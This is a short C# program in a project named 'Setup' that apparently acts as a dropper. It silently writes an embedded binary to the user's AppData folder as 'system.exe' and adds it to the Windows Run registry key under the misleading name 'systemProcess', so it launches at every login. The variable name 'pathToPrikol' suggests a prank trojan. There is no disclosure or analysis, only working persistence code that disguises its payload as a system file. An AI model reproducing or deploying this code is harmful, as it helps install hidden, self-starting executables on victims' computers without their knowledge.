using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace Setup
{
    internal class Program
    {
        static string pathToPrikol = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\system.exe";

        static void Main(string[] args)
        {
            try
            {
                File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
                SetToAutorun("systemProcess");
            }

            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void SetToAutorun(string nameInRegistry)
        {
            try
            {
                using(var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    key.SetValue(nameInRegistry, pathToPrikol);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Ошибка" + ex.Message);
                Console.ForegroundColor = ConsoleColor.White;
            }
        }
    }
}
